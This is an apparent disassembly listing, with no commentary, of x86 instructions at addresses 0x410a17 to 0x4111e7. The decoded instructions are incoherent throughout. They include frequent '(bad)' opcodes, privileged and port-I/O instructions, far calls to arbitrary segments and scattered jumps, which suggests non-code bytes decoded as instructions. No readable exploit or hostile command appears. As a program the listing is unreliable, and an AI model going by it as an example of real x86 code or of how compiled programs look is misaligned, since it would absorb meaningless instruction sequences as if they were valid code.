  410a17:	out    dx,al
  410a18:	fadd   QWORD PTR [eax]
  410a1a:	je     0x4109aa
  410a1c:	adc    ebp,edi
  410a1e:	jae    0x410a0d
  410a20:	xor    eax,edx
  410a22:	imul   edi,DWORD PTR [ebx],0x2eb8fcec
  410a28:	fcomp  DWORD PTR [edi+0x304c520f]
  410a2e:	pop    ds
  410a2f:	push   cs
  410a30:	xor    ah,bl
  410a32:	pop    ecx
  410a33:	push   edi
  410a34:	in     eax,0x8e
  410a36:	mov    ah,0x30
  410a38:	arpl   cx,cx
  410a3a:	sub    esi,edx
  410a3c:	fwait
  410a3d:	jl     0x410a38
  410a3f:	js     0x410a78
  410a41:	jg     0x410a12
  410a43:	nop
  410a44:	popf   
  410a45:	mov    ds:0xc34c459e,eax
  410a4a:	adc    DWORD PTR [eax-0x28],esp
  410a4d:	and    DWORD PTR [edi-0x1b],esi
  410a50:	jecxz  0x410a0f
  410a52:	sbb    al,0x3f
  410a54:	enter  0x3b9a,0xbd
  410a58:	das    
  410a59:	xlat   BYTE PTR ds:[ebx]
  410a5a:	pop    esp
  410a5b:	or     bh,BYTE PTR [eax+0x39f897ca]
  410a61:	lock inc eax
  410a63:	ins    BYTE PTR es:[edi],dx
  410a64:	arpl   WORD PTR [eax],si
  410a66:	xchg   edi,eax
  410a67:	mov    esp,0xc29b9d99
  410a6c:	inc    ecx
  410a6d:	xor    DWORD PTR gs:[ebx],esp
  410a70:	sbb    ch,BYTE PTR [edx]
  410a72:	aad    0x64
  410a74:	push   ebx
  410a75:	daa    
  410a76:	in     eax,0x5
  410a78:	test   al,0x73
  410a7a:	repz xchg edi,eax
  410a7c:	retf   
  410a7d:	outs   dx,DWORD PTR ds:[esi]
  410a7e:	pop    ebx
  410a7f:	dec    ebp
  410a80:	shl    DWORD PTR [edi+0x3f7447ee],cl
  410a86:	jo     0x410a7e
  410a88:	pop    ebp
  410a89:	pop    es
  410a8a:	sub    DWORD PTR [edi-0x64],esp
  410a8d:	div    DWORD PTR [ebp+0x434974d6]
  410a93:	sub    eax,0xe386f84c
  410a98:	call   0xc250:0x40c4f2f
  410a9f:	out    0xee,al
  410aa1:	push   ds
  410aa2:	js     0x410a25
  410aa4:	cld    
  410aa5:	mov    esi,0x86e93293
  410aaa:	pop    ebp
  410aab:	ja     0x410a40
  410aad:	cdq    
  410aae:	xchg   ebx,eax
  410aaf:	lock out 0x1c,al
  410ab2:	leave  
  410ab3:	xor    eax,0xae950854
  410ab8:	xlat   BYTE PTR ds:[ebx]
  410ab9:	xor    eax,0x1c611a3b
  410abe:	push   eax
  410abf:	inc    ebx
  410ac0:	adc    eax,DWORD PTR [edi+0x37]
  410ac3:	ret    0x8da6
  410ac6:	shl    edx,0xf1
  410ac9:	push   ss
  410aca:	mov    bl,0xa1
  410acc:	lods   al,BYTE PTR ds:[esi]
  410acd:	test   DWORD PTR [edx],0x3194cf8c
  410ad3:	scas   eax,DWORD PTR es:[edi]
  410ad4:	inc    edi
  410ad5:	jne    0x410a74
  410ad7:	daa    
  410ad8:	ficom  WORD PTR [esp+esi*4-0x36]
  410adc:	fmul   QWORD PTR [ebx-0x60]
  410adf:	xchg   BYTE PTR ds:0x6588dd07,cl
  410ae5:	loop   0x410af5
  410ae7:	pop    ds
  410ae8:	or     esp,ecx
  410aea:	sub    esp,DWORD PTR ds:0xfb32649a
  410af0:	not    DWORD PTR [eax+0x3552b2ca]
  410af6:	xchg   edx,eax
  410af7:	or     eax,0xdcb5ee77
  410afc:	inc    edi
  410afd:	inc    edx
  410afe:	or     dh,al
  410b00:	loope  0x410aac
  410b02:	sbb    BYTE PTR [edx+0x4d7a0679],bl
  410b08:	and    DWORD PTR es:[eax-0x357a9546],0x2f8f4025
  410b13:	mov    ah,0x9e
  410b15:	rdmsr  
  410b17:	mov    eax,0x2de9e9ee
  410b1c:	jmp    FWORD PTR [edi+0x56]
  410b1f:	pop    eax
  410b20:	sbb    DWORD PTR [edi],ecx
  410b22:	les    ebx,FWORD PTR [esp+ebp*8+0x4112e017]
  410b29:	cli    
  410b2a:	add    al,dh
  410b2c:	cmp    BYTE PTR [ebp+0x77],al
  410b2f:	and    DWORD PTR [esp+ebp*8+0x2c1c70e5],esp
  410b36:	fwait
  410b37:	push   edi
  410b38:	stos   DWORD PTR es:[edi],eax
  410b39:	inc    ebx
  410b3a:	sub    esi,DWORD PTR [bp+di-0x6a]
  410b3e:	push   es
  410b3f:	lds    esp,FWORD PTR [eax-0x2]
  410b42:	fucomip st,st(0)
  410b44:	xchg   ebp,eax
  410b45:	pop    edx
  410b46:	add    eax,0x1076a347
  410b4b:	pop    esp
  410b4c:	scas   al,BYTE PTR es:[edi]
  410b4d:	(bad)  
  410b4e:	and    DWORD PTR [ecx+edx*2],eax
  410b51:	nop
  410b52:	add    edx,DWORD PTR [ebx+0x6828d9d]
  410b58:	pop    es
  410b59:	mov    dl,0x5b
  410b5b:	xchg   ebp,eax
  410b5c:	push   ss
  410b5d:	sti    
  410b5e:	and    eax,0x9909ea83
  410b63:	cmp    ah,BYTE PTR [ebp+0x1d]
  410b66:	inc    ebx
  410b67:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410b68:	jp     0x410bdc
  410b6a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410b6b:	cvtdq2ps xmm0,xmm1
  410b6e:	aaa    
  410b6f:	or     DWORD PTR [edx+0x1e],esi
  410b72:	mov    eax,ecx
  410b74:	jle    0x410b45
  410b76:	lds    eax,FWORD PTR [esi+0x6e]
  410b79:	and    bh,BYTE PTR ds:0xe7557463
  410b7f:	addr16 jg 0x410bdd
  410b82:	lods   eax,DWORD PTR ds:[esi]
  410b83:	fild   DWORD PTR [ebx+0x4b68fbb4]
  410b89:	cld    
  410b8a:	arpl   WORD PTR [esp+esi*2+0x39a11f46],si
  410b91:	push   esp
  410b92:	xor    al,0xd2
  410b94:	add    eax,0x3163103f
  410b99:	or     edx,DWORD PTR [edx+ecx*8-0x3da53500]
  410ba0:	push   eax
  410ba1:	mov    dl,0xc2
  410ba3:	adc    ch,BYTE PTR [eax-0x77]
  410ba6:	jp     0x410b54
  410ba8:	popa   
  410ba9:	push   edx
  410baa:	inc    eax
  410bab:	mov    WORD PTR [eax],cs
  410bad:	lods   al,BYTE PTR ds:[esi]
  410bae:	in     al,0xa8
  410bb0:	fidiv  DWORD PTR [ebx+0x27]
  410bb3:	(bad)  
  410bb4:	leave  
  410bb5:	js     0x410b64
  410bb7:	push   ebp
  410bb8:	outs   dx,BYTE PTR ds:[esi]
  410bb9:	cmp    DWORD PTR [ecx+edx*4],0x6d
  410bbd:	(bad)  
  410bbe:	jns    0x410b58
  410bc0:	js     0x410b73
  410bc2:	jb     0x410b8a
  410bc4:	fs inc esi
  410bc6:	mov    edx,0x9d031133
  410bcb:	mov    WORD PTR [esi],ds
  410bcd:	cmp    eax,0xb01b5a5b
  410bd2:	ret    
  410bd3:	adc    eax,0xdc02829a
  410bd8:	ds in  eax,dx
  410bda:	test   BYTE PTR [esi],0xd9
  410bdd:	or     eax,0xf5dcf7e1
  410be2:	sbb    eax,0xad71dc91
  410be7:	sbb    eax,0xa5716557
  410bec:	cmp    DWORD PTR [ebp+ebp*4+0x395ca193],0xffffff85
  410bf4:	frstor fs:[esi-0xc]
  410bf8:	adc    bl,BYTE PTR [eax+0x7d]
  410bfb:	cmp    BYTE PTR [edx-0x429bd554],dl
  410c01:	mov    cl,0x13
  410c03:	jnp    0x410c11
  410c05:	xchg   ebp,eax
  410c06:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410c07:	pop    ecx
  410c08:	arpl   WORD PTR [ebx-0x78],sp
  410c0b:	mov    dh,BYTE PTR [ecx+0x9d5ab48]
  410c11:	add    dh,BYTE PTR [edx+0x7bf515e]
  410c17:	sub    eax,0xa6bdda8b
  410c1c:	lahf   
  410c1d:	and    edx,ecx
  410c1f:	pushf  
  410c20:	ror    bh,1
  410c22:	add    al,0xe5
  410c24:	pop    esp
  410c25:	aas    
  410c26:	loopne 0x410c0d
  410c28:	jo     0x410c75
  410c2a:	pop    ebx
  410c2b:	es or  edx,esp
  410c2e:	jmp    0x65f98f9
  410c33:	nop
  410c34:	add    al,0x22
  410c36:	or     eax,0xaf4dbf50
  410c3b:	fmulp  st(1),st
  410c3d:	pop    ebp
  410c3e:	jl     0x410c33
  410c40:	aad    0xf6
  410c42:	mov    ds,WORD PTR [eax+0x6b]
  410c45:	in     al,0x41
  410c47:	fwait
  410c48:	clc    
  410c49:	sar    BYTE PTR [edi],1
  410c4b:	push   eax
  410c4c:	push   es
  410c4d:	push   ds
  410c4e:	pop    eax
  410c4f:	and    eax,0xd422af8b
  410c54:	test   al,ah
  410c56:	jecxz  0x410bda
  410c58:	pop    ebp
  410c59:	mov    dh,0xe9
  410c5b:	test   DWORD PTR [eax+0x69b69029],esp
  410c61:	and    BYTE PTR [ecx],al
  410c63:	xchg   ecx,eax
  410c64:	dec    ebx
  410c65:	fist   DWORD PTR [edx-0x7c]
  410c68:	mov    ds:0xc0d7171d,al
  410c6d:	int3   
  410c6e:	int    0x7b
  410c70:	shr    DWORD PTR [ecx+0x4b019555],0x1f
  410c77:	mov    cs,WORD PTR [edi]
  410c79:	mov    eax,0x22e1167d
  410c7e:	je     0x410c62
  410c80:	or     ebp,DWORD PTR [eax-0x12]
  410c83:	imul   ecx,edx,0xffffffef
  410c86:	and    bl,cl
  410c88:	das    
  410c89:	mov    bh,BYTE PTR [edi]
  410c8b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410c8c:	sbb    BYTE PTR [esi],dh
  410c8e:	jae    0x410d05
  410c90:	fdivr  QWORD PTR [edx]
  410c92:	data16 jl 0x410cba
  410c95:	adc    edx,edx
  410c97:	pop    ebp
  410c98:	mov    cr4,ebx
  410c9b:	int    0xda
  410c9d:	fidiv  DWORD PTR [ebx+0x3]
  410ca0:	lods   al,BYTE PTR ds:[esi]
  410ca1:	or     edi,esi
  410ca3:	mov    ch,0x6d
  410ca5:	outs   dx,DWORD PTR ds:[esi]
  410ca6:	(bad)  
  410ca7:	mov    dl,0xec
  410ca9:	jns    0x410ca5
  410cab:	ret    0xca0e
  410cae:	push   ds
  410caf:	lods   al,BYTE PTR ds:[esi]
  410cb0:	xor    al,0xb0
  410cb2:	mov    ebx,ebp
  410cb4:	repnz test bh,al
  410cb7:	es jnp 0x410d2c
  410cba:	push   0xffffffa2
  410cbc:	shl    DWORD PTR [ebp+0x29],0x66
  410cc0:	test   ecx,esp
  410cc2:	retf   0xba6
  410cc5:	lds    esp,FWORD PTR [ebx]
  410cc7:	outs   dx,BYTE PTR ds:[esi]
  410cc8:	or     DWORD PTR [edx],esi
  410cca:	sbb    dl,BYTE PTR [ebx]
  410ccc:	out    dx,eax
  410ccd:	mov    ecx,0x1ba400cd
  410cd2:	inc    edx
  410cd3:	inc    edx
  410cd4:	inc    edi
  410cd5:	ds push edi
  410cd7:	mov    bh,0x4c
  410cd9:	rcl    BYTE PTR [eax-0x483b32f6],cl
  410cdf:	test   BYTE PTR [eax+0x514d4779],dl
  410ce5:	aad    0x1b
  410ce7:	outs   dx,BYTE PTR ds:[esi]
  410ce8:	repnz stc 
  410cea:	fisttp WORD PTR [esi]
  410cec:	sbb    DWORD PTR [edi],0x49
  410cef:	(bad)  
  410cf0:	fiadd  DWORD PTR [eax-0x6018643a]
  410cf6:	neg    DWORD PTR [ebx+0x3b]
  410cf9:	inc    ebx
  410cfa:	dec    edx
  410cfb:	fsubrp st(4),st
  410cfd:	imul   eax,ebp,0xb1a5f9f6
  410d03:	or     ecx,0x3717f8c
  410d09:	mov    bh,0x96
  410d0b:	dec    esp
  410d0c:	pop    ebp
  410d0d:	out    0x37,eax
  410d0f:	(bad)  
  410d10:	sub    DWORD PTR [edi],edi
  410d12:	popf   
  410d13:	test   DWORD PTR [edi],0x8caf2e31
  410d19:	or     ah,BYTE PTR [edx+0x1e4fa26e]
  410d1f:	mov    ss,WORD PTR [edx+0x53b34283]
  410d25:	cmc    
  410d26:	sbb    BYTE PTR [edx+0x931beb9],al
  410d2c:	scas   eax,DWORD PTR es:[edi]
  410d2d:	xor    eax,0xb84c586b
  410d32:	dec    edx
  410d33:	jmp    0x410cc7
  410d35:	or     edx,edx
  410d37:	xchg   ebp,eax
  410d38:	cwde   
  410d39:	or     eax,0x5560a488
  410d3e:	add    al,0x1
  410d40:	daa    
  410d41:	aad    0x1b
  410d43:	in     eax,dx
  410d44:	jl     0x410d50
  410d46:	std    
  410d47:	sub    ecx,DWORD PTR [eax]
  410d49:	sbb    bh,BYTE PTR [ebx+0x1e]
  410d4c:	xor    al,0xd2
  410d4e:	inc    edi
  410d4f:	xor    cl,BYTE PTR [edx-0x2b]
  410d52:	retf   0xf4ed
  410d55:	pop    DWORD PTR [edi]
  410d57:	jb     0x410d20
  410d59:	xor    al,0x49
  410d5b:	adc    eax,0xcbc34e25
  410d60:	nop
  410d61:	leave  
  410d62:	fistp  QWORD PTR [edi]
  410d64:	ds push edi
  410d66:	arpl   WORD PTR ds:0x7c5327fd,di
  410d6c:	daa    
  410d6d:	pusha  
  410d6e:	lea    esi,[ebx]
  410d70:	imul   ebp,ecx,0xffffffc7
  410d73:	js     0x410d03
  410d75:	inc    ecx
  410d76:	or     DWORD PTR [edx-0x197e7af1],ebx
  410d7c:	push   ebp
  410d7d:	pop    edx
  410d7e:	inc    eax
  410d7f:	movd   DWORD PTR ds:0xb0c247b2,mm6
  410d86:	mov    edi,0x70620c4
  410d8b:	xor    cl,al
  410d8d:	call   0x5b2b5a6a
  410d92:	nop
  410d93:	shl    DWORD PTR [ebp-0x268d5b11],1
  410d99:	sub    BYTE PTR [edi-0x118e3be2],ah
  410d9f:	out    0x5a,eax
  410da1:	fmul   QWORD PTR ds:0x38f73a74
  410da7:	add    esp,DWORD PTR [esi+0xa]
  410daa:	icebp  
  410dab:	sub    al,0x50
  410dad:	jmp    0x2d6a:0x719df10b
  410db4:	popa   
  410db5:	inc    eax
  410db6:	pop    ecx
  410db7:	fwait
  410db8:	call   0x5f8d9e57
  410dbd:	mov    ds:0x548c9a0d,eax
  410dc2:	mul    BYTE PTR [edx]
  410dc4:	dec    esi
  410dc5:	inc    ebp
  410dc6:	dec    esi
  410dc7:	cld    
  410dc8:	imul   eax,DWORD PTR [ebp-0x25e9f42d],0xffffffd3
  410dcf:	imul   esi,DWORD PTR ss:[ebx-0x1e],0xffffffa0
  410dd4:	push   ebx
  410dd5:	cmc    
  410dd6:	mov    edx,0xee2bdb8c
  410ddb:	dec    ecx
  410ddc:	push   ebp
  410ddd:	and    BYTE PTR [ecx],ch
  410ddf:	xchg   esi,eax
  410de0:	or     DWORD PTR [ecx-0x51dbec58],edx
  410de6:	ror    BYTE PTR [edx+0x45536d4e],cl
  410dec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410ded:	lahf   
  410dee:	test   bh,bl
  410df0:	out    0x5a,eax
  410df2:	push   0xffffffcc
  410df4:	mov    DWORD PTR [edi+0x3b56400e],0x4060c9bc
  410dfe:	sbb    esp,DWORD PTR [edx]
  410e00:	mov    esp,0x76d72b6d
  410e05:	test   DWORD PTR [eax-0x10],ebx
  410e08:	lock or eax,ecx
  410e0b:	stc    
  410e0c:	push   ebx
  410e0d:	sub    BYTE PTR [ebx-0x6f],ah
  410e10:	data16 fdivr QWORD PTR [ecx]
  410e13:	mov    ecx,0x93b8ab7d
  410e18:	jmp    0x211ec91f
  410e1d:	cmp    eax,0x20c2763a
  410e22:	mov    al,ds:0x1e527ae0
  410e27:	lock or BYTE PTR ds:0xc8f11e6a,0xdd
  410e2f:	jecxz  0x410e48
  410e31:	inc    esi
  410e32:	adc    BYTE PTR [edx],0x84
  410e35:	xchg   esp,eax
  410e36:	or     BYTE PTR [ebx+edx*4+0x774f1979],ch
  410e3d:	jle    0x410e4d
  410e3f:	and    eax,0x4021fa78
  410e44:	sbb    DWORD PTR [esi],edx
  410e46:	jge    0x410e6a
  410e48:	repnz sti 
  410e4a:	shr    ch,cl
  410e4c:	mul    DWORD PTR [edx]
  410e4e:	pop    edi
  410e4f:	(bad)  
  410e50:	loopne 0x410e3c
  410e52:	lea    ecx,[ecx+eax*4-0x6911e38f]
  410e59:	mov    bl,0x11
  410e5b:	je     0x410e92
  410e5d:	xor    BYTE PTR [edx+ecx*2+0x6c00f587],ah
  410e64:	pop    edi
  410e65:	rol    BYTE PTR [edx+0x75b05208],1
  410e6b:	push   edx
  410e6c:	fbld   TBYTE PTR [ecx-0x3e74ba99]
  410e72:	loope  0x410e92
  410e74:	inc    ebx
  410e75:	iret   
  410e76:	out    0x55,al
  410e78:	les    ebp,FWORD PTR [esi+0x50]
  410e7b:	mov    eax,0xcb8852d1
  410e80:	jno    0x410ee5
  410e82:	lods   eax,DWORD PTR ds:[esi]
  410e83:	mov    ds:0x4c5c4037,al
  410e88:	xchg   BYTE PTR [esi+0x38717038],dl
  410e8e:	push   edi
  410e8f:	adc    al,0x22
  410e91:	cmp    ebx,ecx
  410e93:	es push esi
  410e95:	xor    ebp,DWORD PTR [ebx+0x549dd747]
  410e9b:	xor    al,0xf5
  410e9d:	inc    ecx
  410e9e:	mov    esi,0xf19a6c5c
  410ea3:	add    bl,BYTE PTR [esi+0x6f]
  410ea6:	pop    ebx
  410ea7:	inc    esi
  410ea8:	(bad)  
  410ea9:	mov    bh,0xac
  410eab:	mov    cl,BYTE PTR [edx]
  410ead:	or     al,BYTE PTR [esi+0xcb875d2]
  410eb3:	xor    cl,BYTE PTR [ebx-0x3e272e05]
  410eb9:	sub    BYTE PTR [edi],bl
  410ebb:	iret   
  410ebc:	mov    ebx,0x159fc6e5
  410ec1:	ins    DWORD PTR es:[edi],dx
  410ec2:	pop    esp
  410ec3:	in     eax,0xd9
  410ec5:	call   0xa4ce597b
  410eca:	jne    0x410e51
  410ecc:	iret   
  410ecd:	sub    eax,0xf48746b3
  410ed2:	shrd   ecx,ecx,0x36
  410ed6:	test   al,0xcd
  410ed8:	stos   BYTE PTR es:[edi],al
  410ed9:	mov    al,0x44
  410edb:	loope  0x410f1d
  410edd:	(bad)  
  410ede:	(bad)  
  410edf:	dec    esi
  410ee0:	jle    0x410efc
  410ee2:	inc    ecx
  410ee3:	aas    
  410ee4:	xchg   edx,eax
  410ee5:	jg     0x410ee4
  410ee7:	enter  0xebb1,0xc2
  410eeb:	mov    edi,0x4aaa8b5c
  410ef0:	xchg   esp,eax
  410ef1:	std    
  410ef2:	(bad)  
  410ef3:	or     al,0xc2
  410ef5:	out    dx,eax
  410ef6:	aam    0x48
  410ef8:	std    
  410ef9:	das    
  410efa:	pusha  
  410efb:	sbb    edx,DWORD PTR [edi-0x19471aa9]
  410f01:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410f02:	or     DWORD PTR [edx],esi
  410f04:	int3   
  410f05:	aaa    
  410f06:	sbb    al,0x84
  410f08:	daa    
  410f09:	fwait
  410f0a:	add    ecx,DWORD PTR [esp+esi*1+0x69]
  410f0e:	daa    
  410f0f:	ficom  WORD PTR [ebp-0x76]
  410f12:	imul   esp,DWORD PTR [edi+0x6fa391e8],0xffffffa3
  410f19:	pop    ds
  410f1a:	dec    ebp
  410f1b:	lods   al,BYTE PTR ds:[esi]
  410f1c:	or     eax,0xa67d7907
  410f21:	scas   al,BYTE PTR es:[edi]
  410f22:	sub    eax,0xf11707bc
  410f27:	loope  0x410ef1
  410f29:	adc    edi,DWORD PTR [edx+edi*4]
  410f2c:	daa    
  410f2d:	xchg   esp,eax
  410f2e:	mov    fs,WORD PTR ds:0x5b747064
  410f34:	scas   al,BYTE PTR es:[edi]
  410f35:	lds    esi,FWORD PTR [ecx+eax*1-0x5af51a80]
  410f3c:	pop    ecx
  410f3d:	sbb    al,al
  410f3f:	jmp    0x410ef7
  410f41:	jne    0x410f0b
  410f43:	xchg   edx,eax
  410f44:	xchg   esi,eax
  410f45:	in     eax,0x31
  410f47:	(bad)  
  410f48:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410f49:	(bad)  
  410f4a:	(bad)  
  410f4b:	cmp    eax,DWORD PTR [ebx+0x41f99b0d]
  410f51:	fldl2e 
  410f53:	push   ss
  410f54:	and    BYTE PTR [ebx+0x76],bl
  410f57:	mov    eax,0xd6e7cf01
  410f5c:	mov    BYTE PTR [edi+0x6b],al
  410f5f:	dec    edx
  410f60:	and    DWORD PTR [edi-0x5c8ad504],edi
  410f66:	shl    BYTE PTR ds:0x66dac9f2,1
  410f6c:	add    eax,0xdd08333a
  410f71:	fmul   QWORD PTR ds:0x5e944024
  410f77:	daa    
  410f78:	loop   0x410fde
  410f7a:	ficom  DWORD PTR [esi-0x60423356]
  410f80:	shr    bh,cl
  410f82:	xor    al,0xdd
  410f84:	scas   eax,DWORD PTR es:[edi]
  410f85:	push   ecx
  410f86:	not    BYTE PTR [ebp+0x15964b]
  410f8c:	pop    ebp
  410f8d:	xlat   BYTE PTR ds:[ebx]
  410f8e:	test   DWORD PTR [ecx+0x2cd048c3],ecx
  410f94:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410f95:	nop
  410f96:	cmp    al,0x6d
  410f98:	and    al,cl
  410f9a:	jl     0x410fee
  410f9c:	sbb    esi,DWORD PTR [edi+edx*1]
  410f9f:	mov    eax,0x6d4e61c7
  410fa4:	pop    esp
  410fa5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410fa6:	cmc    
  410fa7:	xlat   BYTE PTR ds:[ebx]
  410fa8:	(bad)  
  410fa9:	aam    0x6c
  410fab:	mov    dh,BYTE PTR [ebp-0x30a8e25d]
  410fb1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410fb2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410fb3:	xchg   esp,eax
  410fb4:	shl    DWORD PTR [edx-0x68af55ad],0xf1
  410fbb:	les    edx,FWORD PTR [esi-0x50d4f3b7]
  410fc1:	dec    eax
  410fc2:	pop    esp
  410fc3:	pop    es
  410fc4:	push   0x4857cf05
  410fc9:	call   0xf416:0x18b3b8ae
  410fd0:	out    dx,eax
  410fd1:	clc    
  410fd2:	mul    DWORD PTR [ebx]
  410fd4:	scas   eax,DWORD PTR es:[edi]
  410fd5:	jge    0x410f60
  410fd7:	mov    ds:0xa42a2c19,eax
  410fdc:	clc    
  410fdd:	test   al,0x0
  410fdf:	and    ch,BYTE PTR [ebx]
  410fe1:	mov    ?,WORD PTR [esi-0x10]
  410fe4:	cmp    ch,BYTE PTR [edi]
  410fe6:	sub    al,0xde
  410fe8:	in     al,dx
  410fe9:	mov    edx,0xcba85633
  410fee:	sbb    eax,0x597fb773
  410ff3:	lods   eax,DWORD PTR fs:[esi]
  410ff5:	in     eax,dx
  410ff6:	dec    ebx
  410ff7:	loope  0x411000
  410ff9:	dec    edi
  410ffa:	fidiv  DWORD PTR [ebp-0x4abad4a8]
  411000:	add    al,BYTE PTR ds:0xf84345b
  411006:	es out dx,al
  411008:	pusha  
  411009:	sahf   
  41100a:	cmp    edx,DWORD PTR [eax+ebp*4]
  41100d:	or     edx,DWORD PTR [eax+0x1a]
  411010:	sar    DWORD PTR [edx+ebp*1+0x442d01f7],1
  411017:	mov    esp,0xaa8eb57e
  41101c:	xlat   BYTE PTR ds:[ebx]
  41101d:	or     eax,0x4d24f5f6
  411022:	enter  0x5676,0x54
  411026:	shl    DWORD PTR [eax],0xf9
  411029:	jo     0x411058
  41102b:	push   ds
  41102c:	dec    ecx
  41102d:	retf   
  41102e:	add    ebp,esp
  411030:	out    dx,eax
  411031:	jnp    0x411048
  411033:	mov    eax,ds:0x88f66c4b
  411038:	in     al,0xb1
  41103a:	cld    
  41103b:	out    0x82,eax
  41103d:	jp     0x410ff1
  41103f:	inc    edx
  411040:	retf   
  411041:	and    ah,BYTE PTR [ebx]
  411043:	repnz leave 
  411045:	push   edx
  411046:	mov    ebx,0x9ec827f8
  41104b:	aad    0xa0
  41104d:	sub    dh,BYTE PTR [edi-0x22]
  411050:	sbb    eax,0xfa043eaa
  411055:	bound  esi,QWORD PTR ds:0xe273fb3
  41105b:	pop    ebx
  41105c:	jae    0x411083
  41105e:	retf   0xb14d
  411061:	je     0x4110d2
  411063:	enter  0xf8cb,0xad
  411067:	stos   BYTE PTR es:[edi],al
  411068:	push   ds
  411069:	mov    ebp,0xfe38fdee
  41106e:	push   ecx
  41106f:	jmp    0x67f692c4
  411074:	push   ds
  411075:	sbb    DWORD PTR [ecx-0x447708be],esp
  41107b:	jle    0x4110d3
  41107d:	pop    eax
  41107e:	pop    esi
  41107f:	mov    eax,ds:0xaf7a9b3e
  411084:	(bad)  
  411085:	ins    DWORD PTR es:[edi],dx
  411086:	sub    eax,0x8f67b84c
  41108b:	push   esi
  41108c:	mov    ds:0xa183e2f6,eax
  411091:	pop    ds
  411092:	and    dl,BYTE PTR [eax+0x42b6e7de]
  411098:	and    BYTE PTR [ebx+edi*8],ch
  41109b:	outs   dx,BYTE PTR ds:[esi]
  41109c:	loop   0x411064
  41109e:	jb     0x4110e0
  4110a0:	mov    dl,0xf8
  4110a2:	outs   dx,DWORD PTR ds:[esi]
  4110a3:	aaa    
  4110a4:	push   0xf54e5905
  4110a9:	mov    ebx,edx
  4110ab:	sbb    eax,0x481abb9c
  4110b0:	or     al,0x10
  4110b2:	and    esi,DWORD PTR [edx-0x67]
  4110b5:	call   0xdd915075
  4110ba:	mov    ah,0x49
  4110bc:	or     cl,BYTE PTR [ebx-0x32]
  4110bf:	mov    bl,cl
  4110c1:	mov    ebx,0x6065cfba
  4110c6:	push   cs
  4110c7:	mov    al,0xf1
  4110c9:	cwde   
  4110ca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4110cb:	push   eax
  4110cc:	push   ebx
  4110cd:	and    al,0xc0
  4110cf:	test   al,0x6a
  4110d1:	aam    0xf0
  4110d3:	test   BYTE PTR ds:0x9cd91a2b,bh
  4110d9:	in     eax,0x54
  4110db:	jge    0x411119
  4110dd:	sub    edi,esi
  4110df:	pop    esi
  4110e0:	(bad)  
  4110e1:	dec    ebp
  4110e2:	jl     0x4110a5
  4110e4:	jne    0x411145
  4110e6:	fsub   QWORD PTR [esi+eax*2+0x5e]
  4110ea:	rcl    DWORD PTR [ecx-0x4e744147],0xcf
  4110f1:	scas   eax,DWORD PTR es:[edi]
  4110f2:	cs out dx,al
  4110f4:	fwait
  4110f5:	add    DWORD PTR [ebx],0x76
  4110f8:	pop    ss
  4110f9:	adc    al,0xc8
  4110fb:	sti    
  4110fc:	lock sbb al,ah
  4110ff:	pop    esp
  411100:	rcr    ecx,1
  411102:	sub    al,0xba
  411104:	fwait
  411105:	xor    esp,DWORD PTR ds:0xdbd1013a
  41110b:	movsx  esp,si
  41110e:	imul   eax,DWORD PTR [ebx+0x77721e6],0x6372be2d
  411118:	jge    0x4110fd
  41111a:	dec    ebx
  41111b:	(bad)  [ecx]
  41111d:	imul   esp,DWORD PTR es:[eax-0x2],0xffffffc1
  411122:	pop    esi
  411123:	leave  
  411124:	test   eax,0x8f98aeb0
  411129:	stos   BYTE PTR es:[edi],al
  41112a:	sbb    DWORD PTR [ebp+0x65b1e661],ebp
  411130:	lea    ebp,[ebp-0x49a70639]
  411136:	or     cl,BYTE PTR [eax]
  411138:	dec    dl
  41113a:	(bad)  
  41113b:	rcr    DWORD PTR [edx+esi*4-0x28],1
  41113f:	cdq    
  411140:	pop    ecx
  411141:	je     0x411113
  411143:	mov    ds:0xdf14acfe,al
  411148:	xchg   ebp,eax
  411149:	xchg   DWORD PTR [ebp+0x33a7e234],edx
  41114f:	push   ecx
  411151:	dec    ebx
  411152:	ins    DWORD PTR es:[edi],dx
  411153:	jl     0x41117c
  411155:	cmp    BYTE PTR [ecx-0x6fc80cd],0x3c
  41115c:	and    BYTE PTR [ebx],bl
  41115e:	test   bh,al
  411160:	lahf   
  411161:	xor    ecx,DWORD PTR [ecx+ebp*8-0x45228bc0]
  411168:	fwait
  411169:	int3   
  41116a:	fmulp  st(3),st
  41116c:	jg     0x411146
  41116e:	lods   eax,DWORD PTR ds:[esi]
  41116f:	mov    ds:0x6d568bec,eax
  411174:	jno    0x4111f2
  411176:	pop    ebp
  411177:	dec    ecx
  411178:	inc    eax
  411179:	sub    edx,ebx
  41117b:	daa    
  41117c:	xchg   ebp,eax
  41117d:	out    0x7c,al
  41117f:	cwde   
  411180:	ins    DWORD PTR es:[edi],dx
  411181:	pop    eax
  411182:	mov    al,0xfa
  411184:	retf   0xdd8c
  411187:	adc    BYTE PTR [ebx+ecx*2+0x1aeb9aee],al
  41118e:	cmp    esi,0x3bfb32ba
  411194:	pop    eax
  411195:	sbb    BYTE PTR ds:0xe6a203ac,al
  41119b:	inc    ebx
  41119c:	lock and al,bl
  41119f:	test   DWORD PTR [ebx-0x73142f28],edi
  4111a5:	stos   BYTE PTR es:[edi],al
  4111a6:	repz push es
  4111a8:	adc    BYTE PTR [ecx+eiz*1-0x7c6a2f9c],dl
  4111af:	arpl   WORD PTR [bx],bx
  4111b2:	idiv   BYTE PTR [esi+0x39]
  4111b5:	mov    edx,0x7bbbae25
  4111ba:	and    BYTE PTR [ebp-0x674ac678],ch
  4111c0:	add    eax,0x75c1fd46
  4111c5:	mov    ds:0x95fc9480,al
  4111ca:	and    BYTE PTR [eax-0x2f15172d],dl
  4111d0:	(bad)
  4111d4:	nop
  4111d5:	and    eax,0xaf5be9b6
  4111da:	jmp    0xb461:0x23517e63
  4111e1:	adc    eax,0x5c1738e3
  4111e6:	daa    
  4111e7:	and    dl,BYTE PTR [edi-0x4adf140b]
